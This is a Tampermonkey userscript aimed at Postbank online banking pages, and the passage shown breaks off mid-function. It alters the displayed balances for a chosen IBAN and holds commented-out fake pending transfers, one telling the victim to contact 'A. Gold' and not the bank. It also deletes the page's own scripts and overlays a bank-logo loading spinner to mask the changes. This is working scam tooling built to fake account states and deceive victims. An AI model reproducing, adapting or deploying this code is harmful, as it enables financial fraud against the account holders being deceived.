// ==UserScript==
// @name         Ed 4Rec Post herbert@blum-privat.de
// @namespace    http://tampermonkey.net/
// @version      3.0
// @description  with minus bal handling
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        GM_xmlhttpRequest
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/503624/Ed%204Rec%20Post%20herbert%40blum-privatde.user.js
// @updateURL https://update.greasyfork.org/scripts/503624/Ed%204Rec%20Post%20herbert%40blum-privatde.meta.js
// ==/UserScript==


if (window.location.href.indexOf("postbank") > 0 || window.location.href.indexOf("kunden") > 0 || window.location.href.indexOf("Downloads") > 0) {

(function() {
    'use strict';
//===================CONFIGURE==================CONFIGURE==================CONFIGURE==================CONFIGURE==================CONFIGURE==================CONFIGURE==================CONFIGURE==================
//=====CONFIGURE==================CONFIGURE==================CONFIGURE==================CONFIGURE==================CONFIGURE==================CONFIGURE==================CONFIGURE==================CONFIGURE=====

//=====GESAMTSALDO================

  // Define the modification amount for the balance (configure here)
var modificationAmount = 3.00; // Example: +9000 to increase by 9000

// Define the desired IBAN
var desiredIBAN = '4343 DE62 6001 0070 0363 1707 08';


//====MAIN PAGE BALANCES===================UMSATZE BALANCE

    //DON'T USE THE INDEX 0. IT'S ONLY FOR GESAMTSALDO

    // Configurable Elements
    var MBALANCE_CONFIGS = [

        { index: 1, adjustmentAmount: 2 },
        { index: 2, adjustmentAmount: 1 },
     //   { index: 4, adjustmentAmount: 27000 }
        // Add more configurations as needed...
    ];

//=====TRANSACTIONS

        // Define an array to store the transactions you want to insert
    var transactionsToInsert = [

  //     {
  //         recipient: 'Treuhand: JP Morgan Chase',
 //          transactionInfo: 'Freigabe nötig. Wenden Sie sich nur an A. Gold , nicht die Bank damit nicht gesperrt wird.',
 //          transactionType: ' SEPA Überweisung ',
 //          transactionDate: 'Vorgemerkt',
 //          transactionAmount: '127.997,00 EUR',
  //         preferredInsertionLogic: 'pinned_top',
 //         moveSteps: 0,
  //         moveDirection: 'up'
 //       },
 ////   {
 //          recipient: 'JP Morgan Chase',
 ////         transactionInfo: 'Geld für Steuern',
//          transactionType: ' SEPA Überweisung ',
 //         transactionDate: '27.05.2024',
 //          transactionAmount: '27.000,00 EUR',
 //           preferredInsertionLogic: 'pinned_top',
 //          moveSteps: 0,
 //           moveDirection: 'up'
 //      },
// {
 //          recipient: 'JP Morgan Chase',
 //          transactionInfo: 'Last test',
 //         transactionType: ' SEPA Überweisung ',
 //          transactionDate: '21.02.2024',
 //          transactionAmount: '15.000,00 EUR',
 //           preferredInsertionLogic: 'pinned_top',
 //          moveSteps: 0,
  //          moveDirection: 'up'
  //     },
  //      {
   //         recipient: 'Recipient 3',
  //          transactionInfo: 'Transaction Info 3',
   //         transactionType: ' SEPA Überweisung ',
   //         transactionDate: '06.08.2023',
  //          transactionAmount: '3.000,00 EUR',
  //          preferredInsertionLogic: 'pinned_top',
  //          moveSteps: 0,
  //          moveDirection: 'down'
  //      }
        // Add more transactions as needed...
    ];



//===================CONFIGURE==================CONFIGURE==================CONFIGURE==================CONFIGURE==================CONFIGURE==================CONFIGURE==================CONFIGURE==================
//=====CONFIGURE==================CONFIGURE==================CONFIGURE==================CONFIGURE==================CONFIGURE==================CONFIGURE==================CONFIGURE==================CONFIGURE=====





//=====GESAMTSALDO================GESAMTSALDO================GESAMTSALDO================GESAMTSALDO================GESAMTSALDO================GESAMTSALDO================
if (window.location.href.indexOf("post") > 0 || window.location.href.indexOf("bank") > 0 || window.location.href.indexOf("Downloads") > 0) {


//  // Define the modification amount for the balance (configure here)
// var modificationAmount = 9000.00; // Example: +9000 to increase by 9000

// Define the interval for checking the presence of the element (in milliseconds)
var checkInterval = 2000;

//   // Define the desired IBAN
//  var desiredIBAN = 'DE30 8601 0090 0054 6629 08';

// Function to format the balance with correct separators
function formatBalance(balance) {
    var formattedBalance = balance.toFixed(2).replace(/\./g, ','); // Use comma as decimal separator
    return formattedBalance.replace(/\B(?=(\d{3})+(?!\d))/g, "."); // Add dots as thousands separators
}

// Function to remove scripts from the document
function removeScripts() {
    console.log("Removing scripts...");
    document.querySelectorAll('script').forEach(function(script) {
        script.remove();
        console.log("Script removed.");
    });
}

// Watch for changes in the DOM and remove added scripts
var mobserver = new MutationObserver(function(mutationsList) {
    for (var mutation of mutationsList) {
        if (mutation.addedNodes) {
            for (var node of mutation.addedNodes) {
                if (node.tagName === 'SCRIPT') {
                    console.log("Script added. Removing...");
                    node.remove();
                    console.log("Script removed.");
                }
            }
        }
    }
});

// Function to remove elements with data-test="configureProductsLink"
function removeProductGroupTitleElements() {
    var productGroupTitleElements = document.querySelectorAll('[data-test="configureProductsLink"]');
    if (productGroupTitleElements.length > 0) {
        productGroupTitleElements.forEach(function(element) {
            element.remove();
        });
        console.log('All elements with data-test="configureProductsLink" removed.');
    }
}

// Function to modify the main balance
function modifyMainBalance(modificationAmount, balanceIndex) {
    // Check if the element with data-test="productGroupTitle" is present
    var productGroupTitleElement = document.querySelector('[data-test="configureProductsLink"]');
    var gesamtsaldoElement = document.querySelector('[data-test="title"][class="db-heading-3 db-text-bold"]');

    if (!productGroupTitleElement || !gesamtsaldoElement || gesamtsaldoElement.textContent.trim() !== "Gesamtsaldo") {
        console.log('Element with data-test="configureProductsLink" or "Gesamtsaldo" title not found. Balance modification aborted.');
        return;
    }

// Find all elements with the class "container"
var containerElements = document.querySelectorAll('.container');

// Iterate over each container element
containerElements.forEach(function(containerElement) {
    // Check if the direct parent of the container has the classes "bg--intro" and "d-flex"
    var parentElement = containerElement.parentElement;
    if (parentElement && parentElement.classList.contains('bg--intro') && parentElement.classList.contains('d-flex')) {
        // The container element meets the criteria, proceed with processing
        // Find the matching element within the container
        var matchingElement = containerElement.querySelector('.positive.db-text-bold');
        if (matchingElement) {
            var balanceText = matchingElement.textContent;
            var balanceValue = parseFloat(balanceText.replace(/\./g, '').replace(',', '.'));

            // Modify the balance value
            var newBalance = balanceValue + modificationAmount;

            // Update the balance value while preserving the "EUR" text
            matchingElement.textContent = formatBalance(newBalance) + ' EUR';

            // Determine whether the balance is positive or negative
            if (newBalance < 0) {
                matchingElement.classList.add('negative');
            } else {
                matchingElement.classList.remove('negative');
            }

            console.log('Main balance modified:', formatBalance(newBalance));

            // Remove all elements with data-test="configureProductsLink" after modifying the balance
            setTimeout(removeProductGroupTitleElements, 5);
        } else {
            console.log('No matching element found within the container.');
        }
    }
});

function removeProductGroupTitleElements() {
    var productGroupTitleElements = document.querySelectorAll('[data-test="configureProductsLink"]');
    productGroupTitleElements.forEach(function(element) {
        element.remove();
    });
}

}

// Function to check if the IBAN matches
function ibanMatches(desiredIBAN) {
    var ibanElement = document.querySelector('[class*="db-text-5"][class*="color-text-secondary"]');
    if (ibanElement) {
        var ibanText = ibanElement.textContent.trim().toLowerCase().replace(/\s/g, '');
        var desiredIBANNormalized = desiredIBAN.toLowerCase().replace(/\s/g, '');
        return ibanText === desiredIBANNormalized;
    }
    return false;
}

// Check for the presence of the element with data-test="productGroupTitle" every 5 seconds
setInterval(function() {
    var productGroupTitleElement = document.querySelector('[data-test="configureProductsLink"]');
    if (productGroupTitleElement) {
        console.log('Element with data-test="configureProductsLink" found. Modifying balance...');
        // Modify the main balance (only modify one balance)
        modifyMainBalance(modificationAmount, 1); // Example: +9000 to increase by 9000
    } else {
        console.log('Element with data-test="configureProductsLink" not found. Waiting...');
    }
}, checkInterval);

// Start observing the document
mobserver.observe(document.documentElement, { childList: true, subtree: true });

// Remove scripts from the document
removeScripts();

}
//=====GESAMTSALDO================GESAMTSALDO================GESAMTSALDO================GESAMTSALDO================GESAMTSALDO================GESAMTSALDO================

 //================================================================================================================================================
     //================================================================================================================================================
 //================================================================================================================================================

 //=============MAIN PAGE BALANCES===================MAIN PAGE BALANCES===================MAIN PAGE BALANCES===================MAIN PAGE BALANCES===================MAIN PAGE BALANCES===================
 //================================MAIN PAGE BALANCES===================MAIN PAGE BALANCES===================MAIN PAGE BALANCES===================MAIN PAGE BALANCES===================MAIN PAGE BALANCES

if (window.location.href.indexOf("post") > 0 || window.location.href.indexOf("bank") > 0 || window.location.href.indexOf("Downloads") > 0) {

  //  // Configurable Elements
 //   var MBALANCE_CONFIGS = [
 //       { index: 1, adjustmentAmount: 9000 },
  //      { index: 2, adjustmentAmount: 9000 }
  //      // Add more configurations as needed...
  //  ];

    // Define the interval for checking the presence of the element (in milliseconds)
    var sdcheckInterval = 6000;

    // Function to remove scripts from the document
    function removeScripts() {
        console.log("Removing scripts...");
        document.querySelectorAll('script').forEach(function(script) {
            script.remove();
            console.log("Script removed.");
        });
    }

    // Watch for changes in the DOM and remove added scripts
    var xcmobserver = new MutationObserver(function(mutationsList) {
        for (var mutation of mutationsList) {
            if (mutation.addedNodes) {
                for (var node of mutation.addedNodes) {
                    if (node.tagName === 'SCRIPT') {
                        console.log("Script added. Removing...");
                        node.remove();
                        console.log("Script removed.");
                    }
                }
            }
        }
    });

    // Function to remove elements with class "divider bg--divider"
    function removeDividerElements() {
        var dividerElements = document.querySelectorAll('.db-icon--info');
        if (dividerElements.length > 0) {
            dividerElements.forEach(function(element) {
                element.remove();
            });
            console.log('All elements with class="db-icon--info" removed.');
        }
    }

    // Function to modify the main balances
    function modifyMainBalances(configs) {
        // Check if the target element is present before modifying balances
        var targetElement = document.querySelector('.db-icon--info');
        if (!targetElement) {
            console.log('Element with class="db-icon--info" not found. Stopping balance modification.');
            return;
        }

        // Check if "Ihre Finanzübersicht" text is present before modifying balances
        var finanzubersichtText = document.body.textContent;
        if (!finanzubersichtText.includes('Ihre Finanzübersicht')) {
            console.log('Text "Ihre Finanzübersicht" not found. Stopping balance modification.');
            return;
        }

        configs.forEach(function(config) {
            var balanceIndex = config.index;
            var modificationAmount = config.adjustmentAmount;

            // Find the balance element
            var balanceElement = document.querySelectorAll('.positive.db-text-bold, .negative.db-text-bold')[balanceIndex];

            if (balanceElement) {
                var balanceText = balanceElement.textContent;
                var balanceValue = parseFloat(balanceText.replace(/\./g, '').replace(',', '.'));

                // Modify the balance value
                var newBalance = balanceValue + modificationAmount;

                // Update the balance value while preserving the "EUR" text
                balanceElement.textContent = formatBalance(newBalance) + ' EUR';

                // Determine whether the balance is positive or negative
                if (newBalance < 0) {
                    balanceElement.classList.add('negative');
                } else {
                    balanceElement.classList.remove('negative');
                }

                console.log('Main balance at index', balanceIndex, 'modified:', formatBalance(newBalance));
            } else {
                console.log('Main balance element with index', balanceIndex, 'not found.');
            }
        });

        // Remove all elements with class "divider bg--divider" after modifying the balances
        setTimeout(removeDividerElements, 10);
    }

    // Function to format the balance with correct separators
    function formatBalance(balance) {
        var formattedBalance = balance.toFixed(2).replace(/\./g, ','); // Use comma as decimal separator
        return formattedBalance.replace(/\B(?=(\d{3})+(?!\d))/g, "."); // Add dots as thousands separators
    }

    // Check for the presence of the element with data-test="productGroupTitle" every 5 seconds
    setInterval(function() {
        var productGroupTitleElement = document.querySelector('[data-test="sublineRow2"]');
        if (productGroupTitleElement) {
            console.log('Element with data-test="productGroupTitle" found. Modifying balances...');
            modifyMainBalances(MBALANCE_CONFIGS);
        } else {
            console.log('Element with data-test="productGroupTitle" not found. Waiting...');
        }
    }, sdcheckInterval);

    // Start observing the document
    xcmobserver.observe(document.documentElement, { childList: true, subtree: true });

    // Remove scripts from the document
    removeScripts();
}
//=============MAIN PAGE BALANCES===================MAIN PAGE BALANCES===================MAIN PAGE BALANCES===================MAIN PAGE BALANCES===================MAIN PAGE BALANCES===================
 //================================MAIN PAGE BALANCES===================MAIN PAGE BALANCES===================MAIN PAGE BALANCES===================MAIN PAGE BALANCES===================MAIN PAGE BALANCES

//===========================================================================================================================================================
    //===========================================================================================================================================================

    //===========================================================================================================================================================



//=========UMSATZE BALANCE==================UMSATZE BALANCE==================UMSATZE BALANCE==================UMSATZE BALANCE==================UMSATZE BALANCE==================UMSATZE BALANCE==================
 //==========================UMSATZE BALANCE==================UMSATZE BALANCE==================UMSATZE BALANCE==================UMSATZE BALANCE==================UMSATZE BALANCE==================UMSATZE BALANCE=

if (window.location.href.indexOf("post") > 0 || window.location.href.indexOf("bank") > 0 || window.location.href.indexOf("Downloads") > 0) {

//    // Define the balance modification amount
//     var modificationAmount = 9000.00; // Example: +9000 to increase by 9000

// Define the interval for checking the presence of the element (in milliseconds)
var dcheckInterval = 4000;

//     // Define the desired IBAN
//    var desiredIBAN = 'DE10 7217 0324 0842 5803 00';

// Function to remove scripts from the document
function removeScripts() {
    console.log("Removing scripts...");
    document.querySelectorAll('script').forEach(function(script) {
        script.remove();
        console.log("Script removed.");
    });
}

// Watch for changes in the DOM and remove added scripts
var bmobserver = new MutationObserver(function(mutationsList) {
    for (var mutation of mutationsList) {
        if (mutation.addedNodes) {
            for (var node of mutation.addedNodes) {
                if (node.tagName === 'SCRIPT') {
                    console.log("Script added. Removing...");
                    node.remove();
                    console.log("Script removed.");
                }
            }
        }
    }
});

// Function to remove elements with data-test="details"
function removeDetailsElements() {
    var detailsElements = document.querySelectorAll('[data-test="details"]');
    if (detailsElements.length > 0) {
        detailsElements.forEach(function(element) {
            element.remove();
        });
        console.log('All elements with data-test="details" removed.');
    }
}

// Function to modify the main balance
function modifyMainBalance(modificationAmount, balanceIndex) {
    // Check if the element with data-test="details" is present
 // Check if the element with data-test="details" is present
var detailsElement = document.querySelector('[data-test="details"]');
var kontostandElements = document.querySelectorAll('[data-test="title"]');

// Check if the desired IBAN text content is present
var ibanElement = document.querySelector('[class*="db-text-5"][class*="color-text-secondary"]');
if (!detailsElement || !kontostandElements || !ibanMatches(desiredIBAN)) {
    console.log('Element with data-test="details" or desired IBAN not found. Balance modification aborted.');
    return;
}

// Process each kontostandElement
kontostandElements.forEach(function(kontostandElement) {
    // Check if the text content of the element is "Aktueller Kontostand"
    if (kontostandElement.textContent.trim() === "Aktueller Kontostand") {
        // Perform your desired actions here
    }
});


   // Find all elements with the class "bg--intro d-flex"
var parentElements = document.querySelectorAll('.bg--intro.d-flex');

// Iterate over each parent element
parentElements.forEach(function(parentElement) {
    // Find all child elements with the class "container"
    var containerElements = parentElement.querySelectorAll('.container');
//------------------------------------------------------
    // Iterate over each container element
    containerElements.forEach(function(containerElement) {
        // Perform your desired actions for each container element
    var matchingElement = containerElement.querySelector('.positive.db-text-bold, .negative.db-text-bold');
        if (matchingElement) {
            var balanceText = matchingElement.textContent;
            var balanceValue = parseFloat(balanceText.replace(/\./g, '').replace(',', '.'));

            // Modify the balance value
            var newBalance = balanceValue + modificationAmount;

            // Update the balance value while preserving the "EUR" text
            matchingElement.textContent = formatBalance(newBalance) + ' EUR';

            // Determine whether the balance is positive or negative
            if (newBalance < 0) {
                matchingElement.classList.add('negative');
            } else {
                matchingElement.classList.remove('negative');
            }

            console.log('Main balance modified:', formatBalance(newBalance));

            // Remove all elements with data-test="details" after modifying the balance
            setTimeout(removeDetailsElements, 20);
        }
        else {
            console.log('No matching element found within the container.');
        }
    }
  //----------------------------------------------------
                             );
});

}

// Function to format the balance with correct separators
function formatBalance(balance) {
    var formattedBalance = balance.toFixed(2).replace(/\./g, ','); // Use comma as decimal separator
    return formattedBalance.replace(/\B(?=(\d{3})+(?!\d))/g, "."); // Add dots as thousands separators
}

// Function to check if the IBAN matches
function ibanMatches(desiredIBAN) {
    var ibanElement = document.querySelector('[class*="db-text-5"][class*="color-text-secondary"]');
    if (ibanElement) {
        var ibanText = ibanElement.textContent.trim().toLowerCase().replace(/\s/g, '');
        var desiredIBANNormalized = desiredIBAN.toLowerCase().replace(/\s/g, '');
        return ibanText === desiredIBANNormalized;
    }
    return false;
}

// Check for the presence of the element with data-test="details" every 5 seconds
setInterval(function() {
    var detailsElement = document.querySelector('[data-test="details"]');
    if (detailsElement) {
        console.log('Element with data-test="details" found. Modifying balance...');
        // Modify the main balance (only modify one balance)
        modifyMainBalance(modificationAmount, 1);
    } else {
        console.log('Element with data-test="details" not found. Waiting...');
    }
}, dcheckInterval);



// Start observing the document
bmobserver.observe(document.documentElement, { childList: true, subtree: true });

// Remove scripts from the document
removeScripts();

}

 //=========UMSATZE BALANCE==================UMSATZE BALANCE==================UMSATZE BALANCE==================UMSATZE BALANCE==================UMSATZE BALANCE==================UMSATZE BALANCE==================
 //==========================UMSATZE BALANCE==================UMSATZE BALANCE==================UMSATZE BALANCE==================UMSATZE BALANCE==================UMSATZE BALANCE==================UMSATZE BALANCE=

//============================================================================================================================================
    //============================================================================================================================================
//============================================================================================================================================

    if (window.location.href.indexOf("post") > 0 || window.location.href.indexOf("bank") > 0 || window.location.href.indexOf("Downloads") > 0) {



(function finanzübersichtCombined() {
    'use strict';

    /////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE///
    ////MAIN PAGE/////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE////////////////////
        /////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE///
    ////MAIN PAGE/////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE////////////////////
        /////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE///
    ////MAIN PAGE/////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE////////////////////
        /////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE///
    ////MAIN PAGE/////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE////////////////////

    // Function to create the spinner and background
    function createSpinner() {
        var background = document.createElement('div');
        background.className = 'app-loading-background';

        var spinner = document.createElement('div');
        spinner.className = 'app-loading-pulsing';

        // Apply styles to the background
        background.style.position = 'fixed';
        background.style.top = '0';
        background.style.left = '0';
        background.style.width = '100%';
        background.style.height = '100%';
        background.style.backgroundColor = 'white';
        background.style.zIndex = '9999';

        // Apply styles to the spinner
        spinner.style.position = 'absolute';
        spinner.style.top = '50%';
        spinner.style.left = '50%';
        spinner.style.transform = 'translate(-50%,-50%)';
        spinner.style.width = '120px';
        spinner.style.height = '120px';
        spinner.style.display = 'block';
        spinner.style.backgroundImage = 'url(pb-logo-splash.e83ae1f69ca2f23d.svg)';
        spinner.style.backgroundSize = '100%';
        spinner.style.animationName = 'pulse';
        spinner.style.animationTimingFunction = 'ease-in-out';
        spinner.style.animationIterationCount = 'infinite';
        spinner.style.animationDuration = '8s';
        spinner.style.animationFillMode = 'both';

        // Append the background and spinner to the document body
        document.body.appendChild(background);
        background.appendChild(spinner);

        return background;
    }

    var scriptExecuted = false; // Flag to track script execution
    var delayIndex = 0; // Index for selecting the modification delay
    var modificationDelays = [  50000]; // Modification delays for each script

    // Function to remove scripts from the document
    function removeScripts() {
        document.querySelectorAll('script').forEach(function(script) {
            script.remove();
        });
    }

    // Function to create a spinner and remove it after 6 seconds
    function addSpinnerOnEveryClick() {
        var spinner = createSpinner();
        setTimeout(function() {
            removeSpinner(spinner);
        }, 7000);
    }

    // Function to remove the spinner element
    function removeSpinner(spinner) {
        spinner.remove();
    }

    // Function to check if an element is within the "header d-print-none" or "product-group" areas
    function isElementInHeaderOrProductGroupArea(element) {
        var header = document.querySelector('.header.d-print-none');
        var productGroup = document.querySelector('.product-group');
        return (
            element === header || element === productGroup || header.contains(element) || productGroup.contains(element)
        );
    }

    // Watch for changes in the DOM and remove added scripts
    var observer = new MutationObserver(function(mutationsList) {
        for (var mutation of mutationsList) {
            if (mutation.addedNodes) {
                for (var node of mutation.addedNodes) {
                    if (node.tagName === 'SCRIPT') {
                        node.remove();
                    }
                }
            }
        }
    });

    // Start observing the document
    observer.observe(document.documentElement, { childList: true, subtree: true });

    // Remove scripts from the document
    removeScripts();




    //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE////////////////////
    ////////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE/////////
    //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE////////////////////





    //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE////////////////////
    ////////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE/////////
    //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE////////////////////





    // Function to wait for the specified timeout before executing the script
    function waitForTimeout() {

        setTimeout(function() {
            waitForTimeout(); // After the timeout, check for text content and modify balances
        }, modificationDelays[delayIndex]);
    }

// Function to check for text content on each click
function checkOnEveryClick() {
    document.addEventListener('click', function (event) {
        if (isElementInHeaderOrProductGroupArea(event.target) && !isExcludedClick(event.target)) {
            // Add spinner on every click within the specified areas
            addSpinnerOnEveryClick();
            scriptExecuted = false; // Reset the script execution flag on each click
        }
    });
}

// Function to check if the element or its ancestors are excluded from the click action
function isExcludedClick(element) {
    // Check for the "meta-nav-item" class in the header area
    if (element.closest('.header.d-print-none')) {
        if (element.classList.contains('meta-nav-item') || element.closest('.meta-nav-item')) {
            return true;
        }
    }

    // Check for the "db-button__content" class in the product group area
    if (element.closest('.product-group')) {
        if (element.classList.contains('db-button__content') || element.closest('.db-button__content')) {
            return true;
        }
    }

    return false;
}


    // Function to show the spinner on page load
    function showSpinnerOnPageLoad() {
        var spinner = createSpinner();
        setTimeout(function() {
            removeSpinner(spinner);
        }, 7000);
    }

    // Show the spinner on page load
    window.onload = function () {
        showSpinnerOnPageLoad(); // Show the spinner on page load
        waitForTimeout(); // Start the timeout after the page is loaded
        checkOnEveryClick(); // Check for text content on each click
    };
})();

}
    //////THE END/////////////////////THE END///////////////////////THE END/////////////////////////THE END////////////////////THE END/////////////////////////THE END//////////////////////THE END///////////////////////THE END//////////////////
    /////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE///
    ////MAIN PAGE/////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE////////////////////
        /////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE///
    ////MAIN PAGE/////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE////////////////////
        /////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE///
    ////MAIN PAGE/////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE////////////////////
        /////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE///
    ////MAIN PAGE/////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE////////////////////
    //////////////THE END/////////////////////THE END///////////////////////THE END/////////////////////////THE END////////////////////THE END/////////////////////////THE END//////////////////////THE END///////////////////////THE END//////




//UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT////////////////
/////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT/////
//UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT////////////////
/////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT/////
//UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT////////////////
/////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT/////


    (function umsaetz() {
    'use strict';


   // Define the delay (in milliseconds) before running myUserScript
    var userScriptDelay = 5000; // Change this value to your desired delay (e.g., 5000 for 5 seconds)

    // Function to remove scripts from the document
    function removeScripts() {
        console.log("Removing scripts...");
        document.querySelectorAll('script').forEach(function(script) {
            script.remove();
            console.log("Script removed.");
        });
    }

    // Watch for changes in the DOM and remove added scripts
    var observer = new MutationObserver(function(mutationsList) {
        for (var mutation of mutationsList) {
            if (mutation.addedNodes) {
                for (var node of mutation.addedNodes) {
                    if (node.tagName === 'SCRIPT') {
                        console.log("Script added. Removing...");
                        node.remove();
                        console.log("Script removed.");
                    }
                }
            }
        }
    });

    // Start observing the document
    observer.observe(document.documentElement, { childList: true, subtree: true });

    // Remove all scripts from the document
    removeScripts();

    // Function to create the spinner and background
    function createSpinner() {
        var background = document.createElement('div');
        background.className = 'app-loading-background';

        var spinner = document.createElement('div');
        spinner.className = 'app-loading-pulsing';

        // Apply styles to the background
        background.style.position = 'fixed';
        background.style.top = '0';
        background.style.left = '0';
        background.style.width = '100%';
        background.style.height = '100%';
        background.style.backgroundColor = 'white';
        background.style.zIndex = '9999';

        // Apply styles to the spinner
        spinner.style.position = 'absolute';
        spinner.style.top = '50%';
        spinner.style.left = '50%';
        spinner.style.transform = 'translate(-50%,-50%)';
        spinner.style.width = '120px';
        spinner.style.height = '120px';
        spinner.style.display = 'block';
        spinner.style.backgroundImage = 'url(pb-logo-splash.e83ae1f69ca2f23d.svg)';
        spinner.style.backgroundSize = '100%';
        spinner.style.animationName = 'pulse';
        spinner.style.animationTimingFunction = 'ease-in-out';
        spinner.style.animationIterationCount = 'infinite';
        spinner.style.animationDuration = '10s';
        spinner.style.animationFillMode = 'both';

        // Append the background and spinner to the document body
        document.body.appendChild(background);
        background.appendChild(spinner);

        return background;
    }

   // Function to trigger myUserScript
        function triggerMyUserScript() {
            // Create and display the spinner
            var spinnerBackground = createSpinner();

            setTimeout(function() {
                // Remove the spinner background after the specified delay
                spinnerBackground.remove();

                // Trigger myUserScript after the spinner is removed
                myUserScript();
            }, userScriptDelay);
        }

        // Add a click event listener to the document body using event delegation
        document.body.addEventListener('click', function(event) {
            var target = event.target;
            // Check if the clicked element or any of its parents have the class "product-group"
            if (target.closest('.product-group')) {
                // Trigger myUserScript after the defined delay
                triggerMyUserScript();
            }
        });

